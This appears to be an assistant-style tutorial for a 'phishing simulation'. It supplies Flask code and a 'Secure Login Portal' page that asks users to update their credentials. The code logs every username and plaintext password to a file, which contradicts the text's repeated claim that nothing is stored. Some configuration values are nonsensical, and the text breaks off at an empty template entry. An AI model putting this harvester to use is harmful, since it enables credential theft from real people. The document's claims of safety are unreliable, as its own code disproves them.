To create a controlled simulation of a phishing attack for testing user responses, follow these steps:

### Overview

The goal is to develop a program that simulates a phishing attack without causing harm. This involves creating a fake email and a corresponding fake login page. The program should capture user input to study responses without storing sensitive data or causing damage.

### Components of the Phishing Simulation

1. **Fake Email Generation**: Create an email that appears to be from a legitimate company, requesting users to update their information.
2. **Fake Login Page**: Design a webpage that looks like a real login portal to collect user credentials.
3. **Credential Capture**: Collect and log user input without storing it.
4. **Cleanup**: Ensure no data is persisted after the simulation ends.

### Tools and Technologies

- **Flask**: For creating the fake login page and handling HTTP requests.
- **Flask-Mail**: For sending fake emails.
- **HTML/CSS**: To design the login page.
- **JavaScript**: For additional interactivity and real-time feedback.

### Code Implementation

```python
from flask import Flask, render_template, request, redirect, url_for
from flask_mail import Mail

app = Flask(__name__)
app.config['debug'] = True
app.config['TEMPLATES'] = {
    'backbone': {
        'app_dir': 'templates',
        'fsync': True
    }
}
mail = Mail(app)

# Sample users for testing
users = [
    {'name': 'John Doe', 'email': 'john.doe@example.com', 'account': 'johndoe'},
    {'name': 'Jane Smith', 'email': 'jane.smith@example.com', 'account': 'janesmith'}
]

# Create a route for the login page
@app.route('/')
def home():
    return redirect('login')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        # Log the captured credentials
        with open('simulation_log.txt', 'a') as f:
            f.write(f"User {username} entered credentials.\n")
            f.write(f"Username: {username}, Password: {password}\n")
        return "Thank you for your response! Your simulation has been completed."
    return render_template('login.html')

# Create a route for the success page
@app.route('/success')
def success():
    return "Phishing simulation completed successfully."

# Start the Flask application
if __name__ == '__main__':
    app.run(port=5000)
```

### Supporting Files

1. **templates/login.html**:
```html
<!DOCTYPE html>
<html>
<head>
    <title>Login Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
        }
        .login-container {
            background-color: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        .login-header {
            text-align: center;
            padding-bottom: 20px;
        }
        .form-group {
            margin: 10px 0;
        }
        input[type="text"], input[type="password"] {
            width: 300px;
            padding: 8px;
            margin-top: 5px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button {
            background-color: #4CAF50;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
        .message {
            color: red;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <h1>Secure Login Portal</h1>
            <p>Your account security is important. Please update your credentials:</p>
        </div>
        <form method="post" action="/login">
            <div class="form-group">
                <label for="username">Username or Email</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit">Login</button>
        </form>
        <div class="message">
            This message is for testing purposes only. Please do not share your credentials in real scenarios.
        </div>
    </div>
</body>
</html>
```

2. **templates/base.html**:
